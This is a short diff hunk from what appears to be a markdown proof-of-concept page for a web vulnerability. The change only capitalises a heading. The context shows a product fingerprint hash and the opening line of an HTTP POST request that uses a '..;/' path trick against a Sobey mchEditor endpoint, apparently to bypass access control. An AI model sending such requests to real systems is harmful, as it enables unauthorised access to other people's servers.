@@ -8,7 +8,7 @@
 icon_hash="689611853"
 ```
 
-## poc
+## POC
 
 ```javascript
 POST /sobey-mchEditor/js/..;/mch/WXArticleInt/restore HTTP/1.1
